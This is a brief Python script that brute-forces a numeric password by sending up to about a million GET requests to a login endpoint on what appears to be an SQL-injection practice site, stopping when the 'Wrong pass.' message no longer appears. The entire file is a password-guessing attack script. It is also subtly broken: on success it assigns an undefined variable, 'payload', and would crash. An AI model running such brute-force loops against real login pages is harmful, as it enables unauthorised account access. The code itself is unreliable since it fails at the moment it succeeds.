import requests

for i in range(1, 999999): 
    url = "https://www.zixem.altervista.org/SQLi/login_do.php?pass="+str(i)
    req = requests.get(url)

    if "Wrong pass." in req.text:
        print("Tested with payload: ", i)
    else:
        key = payload
        break        

print(key)